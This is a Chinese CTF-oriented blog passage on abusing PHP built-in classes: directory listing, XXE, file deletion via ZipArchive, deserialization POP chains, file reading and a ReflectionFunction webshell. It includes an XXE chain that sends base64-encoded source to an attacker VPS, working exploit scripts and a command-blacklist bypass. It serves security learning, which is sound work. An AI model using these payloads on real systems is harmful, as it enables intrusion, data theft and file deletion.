对目录的限制，可以用来列举出指定目录下的文件。\n测试代码：\n// test.php\n&lt;?php\n$dir = $_GET['whoami'];\n$a = new DirectoryIterator($dir);\nforeach($a as $f)&#123;\n    echo($f->__toString().'&lt;br>');\n&#125;\n?>\n\n# payload一句话的形式:\n$a = new DirectoryIterator(\"glob:///*\");foreach($a as $f)&#123;echo($f->__toString().'&lt;br>');&#125;\n\n\n\n配合 glob:///* 打\n\n\n但是会发现只能列根目录和 open_basedir 指定的目录的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。\n\n同样效果的还有 FilesystemIterator 类与 GlobIterator 类\n\n0x06 使用 SimpleXMLElement 类进行 XXESimpleXMLElement官方文档中对于 SimpleXMLElement 类的构造方法 SimpleXMLElement::__construct 的定义如下：\n\n\n\n\n可以看到通过设置第三个参数 data_is_url 为 true，我们可以实现远程 xml 文件的载入。第二个参数的常量值我们设置为 2 即可。第一个参数 data 就是我们自己设置的 payload 的 url 地址，即用于引入的外部实体的 url。\n这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。\n[SUCTF 2018]Homework进入题目，随便注册一个账号，登录作业平台。看到一个 calc 计算器类的代码。有两个按钮，一个用于调用 calc 类实现两位数的四则运算。另一个用于上传文件，提交代码。\n\n\n源代码拿下来\n&lt;?php\nclass calc&#123;\n    function __construct__()&#123;\n        calc();\n    &#125;\n\n    function calc($args1,$method,$args2)&#123;\n        $args1=intval($args1);\n        $args2=intval($args2);\n        switch ($method) &#123;\n            case 'a':\n                $method=\"+\";\n                break;\n\n            case 'b':\n                $method=\"-\";\n                break;\n\n            case 'c':\n                $method=\"*\";\n                break;\n\n            case 'd':\n                $method=\"/\";\n                break;\n\n            default:\n                die(\"invalid input\");\n        &#125;\n        $Expression=$args1.$method.$args2;\n        eval(\"\\$r=$Expression;\");\n        die(\"Calculation results:\".$r);\n    &#125;\n&#125;\n?>\n\n\n点一下 calc 键，结果如图\n\n\n\n可知 module 为调用的类，args 为类的构造方法的参数，那我们就可以构造一个用 SimpleXMLElement 来攻击的恶意类\n在 vps 上编辑 evil.xml\nevil.xml\n&lt;?xml version=\"1.0\"?>\n&lt;!DOCTYPE ANY[\n&lt;!ENTITY % remote SYSTEM \"http://47.xxx.xxx.72:8390/send.xml\">\n%remote;\n%all;\n%send;\n]>\n\nsend.xml\n&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php&quot;&gt;\n&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;47.xxx.xxx.72:8990&#x2F;send.php?file&#x3D;%file;&#39;&gt;&quot;&gt;\n\nsend.php\n&lt;?php \nfile_put_contents(&quot;result.txt&quot;, $_GET[&#39;file&#39;]) ;\n?&gt;\n\n然后在url中构造如下：\n&#x2F;show.php?module&#x3D;SimpleXMLElement&amp;args[]&#x3D;http:&#x2F;&#x2F;47.xxx.xxx.72:8390&#x2F;evil.xml&amp;args[]&#x3D;2&amp;args[]&#x3D;true\n\n这样目标主机就能先加载我们vps上的evil.xml，再加载send.xml。\n如下图所示，成功将网站的源码以base64编码的形式读取并带出到result.txt中：\n\n\n这里能够读取到 index.php 的源码了\nindex.php\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;head>\n&lt;title>PHP Homework Platform&lt;/title>\n&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n&lt;script type=\"application/x-javascript\"> addEventListener(\"load\", function() &#123; setTimeout(hideURLbar, 0); &#125;, false); function hideURLbar()&#123; window.scrollTo(0,1); &#125; &lt;/script>\n&lt;link href=\"css/font-awesome.min.css\" rel=\"stylesheet\" type=\"text/css\" media=\"all\">\n&lt;link href=\"css/snow.css\" rel=\"stylesheet\" type=\"text/css\" media=\"all\" />\n&lt;link href=\"css/style.css\" rel=\"stylesheet\" type=\"text/css\" media=\"all\" />\n&lt;link type=\"text/css\" rel=\"stylesheet\" href=\"images/Styles/SyntaxHighlighter.css\">&lt;/link>\n&lt;/head>\n&lt;body>\n&lt;!-- /home/wwwroot/default-->\n&lt;div class=\"snow-container\">\n\t\t\t  &lt;div class=\"snow foreground\">&lt;/div>\n\t\t\t  &lt;div class=\"snow foreground layered\">&lt;/div>\n\t\t\t  &lt;div class=\"snow middleground\">&lt;/div>\n\t\t\t  &lt;div class=\"snow middleground layered\">&lt;/div>\n\t\t\t  &lt;div class=\"snow background\">&lt;/div>\n\t\t\t  &lt;div class=\"snow background layered\">&lt;/div>\n\t\t\t&lt;/div>\n\n&lt;div class=\"top-buttons-agileinfo\">\n&lt;/div>\n&lt;h1>PHP Homework Platform&lt;/h1>\n&lt;div class=\"main-agileits\">\n&lt;?php\n\tinclude(\"function.php\");\n\tinclude(\"config.php\");\n\n\t$username=w_addslashes($_COOKIE['user']);\n\t$check_code=$_COOKIE['cookie-check'];\n\t$check_sql=\"select password from user where username='\".$username.\"'\";\n\t$check_sum=md5($username.sql_result($check_sql,$mysql)['0']['0']);\n\tif($check_sum!==$check_code)&#123;\n\t\theader(\"Location: login.php\");\n\t&#125;\n?>\n\t\t&lt;textarea name=\"code\" class=\"php\" rows=\"20\" cols=\"55\" disabled=\"disabled\">\n&lt;?php readfile(\"./calc.php\");?>\n\t\t&lt;/textarea>\n\t\t&lt;div class=\"top-buttons-agileinfo\">\n\t\t\t&lt;a href=\"show.php?module=calc&amp;args[]=2&amp;args[]=a&amp;args[]=2\">calc&lt;/a>\n\t\t\t&lt;a href=\"submit.php\" class=\"active\">Submit homework&lt;/a>\n\t\t&lt;/div>\n&lt;/div>\n\t&lt;script type=\"text/javascript\" src=\"js/jquery-2.1.4.min.js\">&lt;/script>\n\t&lt;script class=\"javascript\" src=\"images/Scripts/shBrushPhp.js\">&lt;/script>\n\t&lt;script class=\"javascript\">\n\t\tdp.SyntaxHighlighter.HighlightAll('code');\n\t&lt;/script> \n&lt;/body>\n&lt;/html>\n\n因为这里还存在 submt.php，所以去读一下它的源码\nsubmit.php\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;head>\n&lt;title>PHP Homework Platform&lt;/title>\n&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n&lt;script type=\"application/x-javascript\"> addEventListener(\"load\", function() &#123; setTimeout(hideURLbar, 0); &#125;, false); function hideURLbar()&#123; window.scrollTo(0,1); &#125; &lt;/script>\n&lt;link href=\"css/font-awesome.min.css\" rel=\"stylesheet\" type=\"text/css\" media=\"all\">\n&lt;link href=\"css/snow.css\" rel=\"stylesheet\" type=\"text/css\" media=\"all\" />\n&lt;link href=\"css/style.css\" rel=\"stylesheet\" type=\"text/css\" media=\"all\" />\n&lt;/head>\n&lt;body>\n&lt;div class=\"snow-container\">\n\t\t\t  &lt;div class=\"snow foreground\">&lt;/div>\n\t\t\t  &lt;div class=\"snow foreground layered\">&lt;/div>\n\t\t\t  &lt;div class=\"snow middleground\">&lt;/div>\n\t\t\t  &lt;div class=\"snow middleground layered\">&lt;/div>\n\t\t\t  &lt;div class=\"snow background\">&lt;/div>\n\t\t\t  &lt;div class=\"snow background layered\">&lt;/div>\n\t\t\t&lt;/div>\n&lt;h1>PHP Homework Platform&lt;/h1>\n&lt;?php\n\tinclude(\"config.php\");\n\tinclude(\"function.php\");\n\n\t$username=w_addslashes($_COOKIE['user']);\n\t$check_code=$_COOKIE['cookie-check'];\n\t$check_sql=\"select password from user where username='\".$username.\"'\";\n\t$check_sum=md5($username.sql_result($check_sql,$mysql)['0']['0']);\n\tif($check_sum!==$check_code)&#123;\n\t\theader(\"Location: login.php\");\n\t&#125;\n?>\n&lt;div class=\"main-agileits\">\n\t\t&lt;div class=\"form-w3-agile\">\n\t\t\t&lt;h2 class=\"sub-agileits-w3layouts\">Submit Homework&lt;/h2>\n\t\t\t&lt;form action=\"submit.php\" enctype=\"multipart/form-data\" method=\"post\">\n\t\t\t\t\t&lt;input type=\"file\" name=\"file\" placeholder=\"phpfile\" required=\"\" />\n\t\t\t\t\t&lt;?php echo \"&lt;input type=\\\"hidden\\\" name=\\\"sig\\\" value=\".mt_rand().\">\";?>\n\t\t\t\t&lt;div class=\"submit-w3l\">\n\t\t\t\t\t&lt;input type=\"submit\" value=\"Submit\">\n\t\t\t\t&lt;/div>\n\t\t\t&lt;/form>\n\t\t&lt;/div>\n\t\t&lt;/div>\n\t&lt;script type=\"text/javascript\" src=\"js/jquery-2.1.4.min.js\">&lt;/script>\n\n&lt;/body>\n&lt;/html>\n&lt;?php\n\tupload_file($mysql);\n?>\n\n后面是一个二次注入，本文不再展开。\n0x07 使用 ZipArchive 类来删除文件ZipArchive 类PHP ZipArchive 类是 PHP 的一个原生类，它是在 PHP 5.2.0 之后引入的。ZipArchive 类可以对文件进行压缩与解压缩处理。\n下面列举几个常见的类方法：\n\nZipArchive::addEmptyDir：添加一个新的文件目录\nZipArchive::addFile：将文件添加到指定zip压缩包中\nZipArchive::addFromString：添加新的文件同时将内容添加进去\nZipArchive::close：关闭 ZipArchive\nZipArchive::extractTo：将压缩包解压\nZipArchive::open：打开一个zip压缩包\nZipArchive::deleteIndex：删除压缩包中的某一个文件，如：deleteIndex(0) 代表删除第一个文件\nZipArchive::deleteName：删除压缩包中的某一个文件名称，同时也将文件删除\n……\n\n我们来重点看看 ZipArchive::open 方法：\nZipArchive::open ( string $filename [, int $flags ] ) : mixed\n\n该方法用来打开一个新的或现有的 zip 存档以进行读取，写入或修改。\n\n$filename：要打开的 ZIP 存档的文件名。\n$flags：用于打开档案的模式。有以下几种模式：\nZipArchive::OVERWRITE：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。\nZipArchive::CREATE：如果不存在则创建一个 zip 压缩包。\nZipArchive::RDONLY：只读模式打开压缩包。\nZipArchive::EXCL：如果压缩包已经存在，则出错。\nZipArchive::CHECKCONS：对压缩包执行额外的一致性检查，如果失败则显示错误。\n\n注意，如果设置 flags 参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到 const OVERWRITE = 8，也就是将 OVERWRITE 定义为了常量8，我们在调用时也可以直接将 $flags 赋值为8。\n也就是说我们可以利用 ZipArchive 原生类调用 open 方法删除目标主机上的文件。\n\nexample\n\n$a = new ZipArchive();\n$a->open('1.txt',ZipArchive::OVERWRITE);  \n// ZipArchive::OVERWRITE:  总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖\n// 因为没有保存，所以效果就是删除了1.txt\n\n[NepCTF 2021] 梦里花开牡丹亭源码链接 ———— https://github.com/fghcvjk/NepCTF-2021/blob/master/%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD.zip\n题目源码如下\n&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude('shell.php');\nclass Game&#123;\n    public  $username;\n    public  $password;\n    public  $choice;\n    public  $register;\n \n    public  $file;\n    public  $filename;\n    public  $content;\n \n    public function __construct()\n    &#123;\n        $this->username='user';\n        $this->password='user';\n    &#125;\n \n    public function __wakeup()&#123;\n        if(md5($this->register)===\"21232f297a57a5a743894a0e4a801fc3\")&#123;    // admin\n            $this->choice=new login($this->file,$this->filename,$this->content);\n        &#125;else&#123;\n            $this->choice = new register();\n        &#125;\n    &#125;\n    public function __destruct() &#123;\n        $this->choice->checking($this->username,$this->password);\n    &#125;\n \n&#125;\nclass login&#123;\n    public $file;\n    public $filename;\n    public $content;\n \n    public function __construct($file,$filename,$content)\n    &#123;\n        $this->file=$file;\n        $this->filename=$filename;\n        $this->content=$content;\n    &#125;\n    public function checking($username,$password)\n    &#123;\n        if($username==='admin'&amp;&amp;$password==='admin')&#123;\n            $this->file->open($this->filename,$this->content);\n            die('login success you can to open shell file!');\n        &#125;\n    &#125;\n&#125;\nclass register&#123;\n    public function checking($username,$password)\n    &#123;\n        if($username==='admin'&amp;&amp;$password==='admin')&#123;\n            die('success register admin');\n        &#125;else&#123;\n            die('please register admin ');\n        &#125;\n    &#125;\n&#125;\nclass Open&#123;\n    function open($filename, $content)&#123;\n        if(!file_get_contents('waf.txt'))&#123;    // 当waf.txt没读取成功时才能得到flag\n            shell($content);\n        &#125;else&#123;\n            echo file_get_contents($filename.\".php\");    // filename=php://filter/read=convert.base64-encode/resource=shell\n        &#125;\n    &#125;\n&#125;\nif($_GET['a']!==$_GET['b']&amp;&amp;(md5($_GET['a']) === md5($_GET['b'])) &amp;&amp; (sha1($_GET['a'])=== sha1($_GET['b'])))&#123;\n    @unserialize(base64_decode($_POST['unser']));\n&#125;\n\n数组绕过哈希比较由于md5()和sha1()函数都无法处理数组，因此传入一个数组会返回false。因此这里可以绕过需要两个不同的数但是其哈希值要相等。\nexample：\n\n\n大致 POP 链Game#__wakeup() ——&gt; new login() ——&gt; login#checking() ——&gt; this-&gt;$file-&gt;open ——&gt; Open#open()\n\n构造 EXP\n&lt;?php\nclass Game&#123;\n    public  $username;\n    public  $password;\n    public  $choice;\n    public  $register;\n \n    public  $file;\n    public  $filename;\n    public  $content;\n&#125;\n \nclass login&#123;\n    public $file;\n    public $filename;   \n    public $content;\n&#125;\n \nclass Open&#123;\n \n&#125;\n$poc = new Game();\n$poc->username = \"admin\";\n$poc->password = \"admin\";\n$poc->register = \"admin\";\n$poc->file = new Open();\n$poc->filename = \"php://filter/read=convert.base64-encode/resource=shell\";\n$poc->content = \"xxx\";\necho base64_encode(serialize($poc));\n\npayload 攻击成功\n\n\n得到 shell.php 内容如下\n&lt;?php\nfunction shell($cmd)&#123;\n    if(strlen($cmd)&lt;10)&#123;\n        if(preg_match('/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/',$cmd))&#123;\n            die(\"NO\");\n        &#125;else&#123;\n            return system($cmd);\n        &#125;\n    &#125;else&#123;\n        die('so long!'); \n    &#125;\n&#125;\n\n一个命令执行的地方，所以这里需要我们先想办法删除 waf.txt\n利用 ZipArchive 原生类删除文件刚好我们的 ZipArchive 类里面也有一个open()方法，构造如下\nZipArchive::open($filename, $flags = null)\n\n如果设置 flags 参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到 const OVERWRITE &#x3D; 8，也就是将 OVERWRITE 定义为了常量8，我们在调用时也可以直接将 flags 赋值为8。\n所以我们利用 ZipArchive 原生类调用 open 方法，即可将即可将 $filename（waf.txt）删除：\n因为都是调用了 open() 方法，构造 PoC 如下\n&lt;?php\n// highlight_file(__FILE__);\nerror_reporting(-1);\nclass Game&#123;\n    public  $username;\n    public  $password;\n    public  $choice;\n    public  $register;\n \n    public  $file;\n    public  $filename;\n    public  $content;\n \n&#125;\nclass login&#123;\n    public $file;\n    public $filename;\n    public $content;\n&#125;\n \nclass Open&#123;\n&#125;\n \n$poc = new Game();\n$poc->username = \"admin\";\n$poc->password = \"admin\";\n$poc->register = \"admin\";\n$poc->file = new ZipArchive();\n$poc->filename = \"waf.txt\";\n$poc->content = 8;\necho base64_encode(serialize($poc));\n \n?>\n\n执行之后即可删除 waf.txt。注意我这里在本地复现的时候需要把目录文件夹的所有权和分组都给到www-data才能成功删除文件\n命令执行绕过黑名单和字符数限制最后一步就是执行我们的命令去读 flag，回过头来看我们的 shell.php\n&lt;?php\nfunction shell($cmd)&#123;\n    if(strlen($cmd)&lt;10)&#123;\n        if(preg_match('/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/',$cmd))&#123;\n            die(\"NO\");\n        &#125;else&#123;\n            return system($cmd);\n        &#125;\n    &#125;else&#123;\n        die('so long!'); \n    &#125;\n&#125;\n\n这里首先限制了我们的命令长度要小于10个字符，然后字符里面不能有黑名单字符出现，这里我们绕过的方法很多，举个例：\nn\\l /flag\n\nPOC:\n&lt;?php\n// highlight_file(__FILE__);\nerror_reporting(-1);\nclass Game&#123;\n    public  $username;\n    public  $password;\n    public  $choice;\n    public  $register;\n\n    public  $file;\n    public  $filename;\n    public  $content;\n\n&#125;\nclass login&#123;\n    public $file;\n    public $filename;\n    public $content;\n&#125;\n\nclass Open&#123;\n&#125;\n\n$poc = new Game();\n$poc->username = \"admin\";\n$poc->password = \"admin\";\n$poc->register = \"admin\";\n$poc->file = new Open();\n$poc->filename = \"xxx\";\n$poc->content = \"n\\l /flag\";\necho base64_encode(serialize($poc));\n\n?>\n\n\n\n0x08 使用 SqlFileObject 读取文件内容SplFileObject 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。详情请参考：https://www.php.net/manual/zh/class.splfileobject.php\n该类的构造方法可以构造一个新的文件对象用于后续的读取。\n我们可以像类似下面这样去读取一个文件的一行：\n&lt;?php\n$context = new SplFileObject('/Drunkbaby.txt');\necho $context;\n\n\n\n但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历：\n&lt;?php\n$context = new SplFileObject('Drunkbaby.txt');\nforeach($context as $f)&#123;\n    echo($f);\n&#125;\n\n\n\n\n例题可以看这一道，很好理解\n\nhttps://github.com/Drun1baby/CTF-Repo-2023/blob/main/2023/%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9FCTF/WP.md\n0x09 反射类 Reflection大体上和 Java 的反射也是一样的\nReflectionMethod 类报告了一个方法的有关信息。ReflectionMethod 类中有很多继承方法可以使用，比如这个 getDocComment() 方法，我们可以用它来获取类中各个函数注释内容\nexample:\n&lt;?php\nclass FlagIsHere\n&#123;\n  /**\n   * 这是测试方法\n   * flag&#123;success&#125;\n   * @return int\n   */\n  protected function GiveMeFlag()\n  &#123;\n    return 9999;\n  &#125;\n&#125;\n \n$ref = new ReflectionMethod('FlagIsHere','GiveMeFlag');\nvar_dump($ref->getDocComment());\n\n\n\n使用ReflectionClass类读取类的属性和方法名\nReflectionClass 类报告了一个类的有关信息。其中初始化方法能够返回类的实例。\n\npublic ReflectionClass::__construct(mixed $argument)\n\n\n$argument：既可以是包含类名的字符串（string）也可以是对象（object）。\n\n用法如下\nexample：\n\n\n把类里面属性和方法的名字都能够显示出来。\n使用 ReflectionFunction 类写 WebshellReflectionFunction 类报告了一个函数的有关信息。其中invokeArgs()方法能够用来写Webshell。\npublic ReflectionFunction::invokeArgs(array $args): mixed\n\n\n$args：传递给函数的参数是一个数组，像 call_user_func_array() 的工作方式。\n\nexample:\n&lt;?php\nfunction title($title, $name)\n&#123;\n    return sprintf(\"%s. %s\\r\\n\", $title, $name);\n&#125;\n \n$function = new ReflectionFunction('title');\n \necho $function->invokeArgs(array('Dr', 'Phil'));\n?>\n\n\n\n我们可以使用这个方法来写 Webshell：\n&lt;?php\n    $func = new ReflectionFunction($_GET[m]);\n    echo $func->invokeArgs(array($_GET[c]));\n?>\n\n成功\n\n\n实际应用的 CTF 题目 红帽杯 2021 决赛 upload\n0x10 小结最近一直在补这些基础知识，像极了精卫填海\n","categories":["PHP"],"tags":["PHP"]}]